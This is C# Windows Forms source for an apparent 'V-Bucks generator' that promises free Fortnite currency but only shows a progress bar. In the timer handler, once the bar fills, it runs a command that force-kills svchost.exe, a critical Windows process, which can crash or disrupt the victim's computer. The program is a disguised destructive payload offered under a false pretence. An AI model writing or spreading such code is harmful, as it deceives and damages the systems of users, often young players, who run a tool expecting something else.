using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Vbucks_Generator
{
    public partial class Vbucks : Form
    {
        public Vbucks()
        {
            InitializeComponent();
        }

        private void Vbucks_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            progressBar1.Visible = true;
            this.timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            this.progressBar1.Increment(1);
            if (progressBar1.Value == 1000)
            {
                text.Visible = true;
                System.Threading.Thread.Sleep(1000);
                Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F");

            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
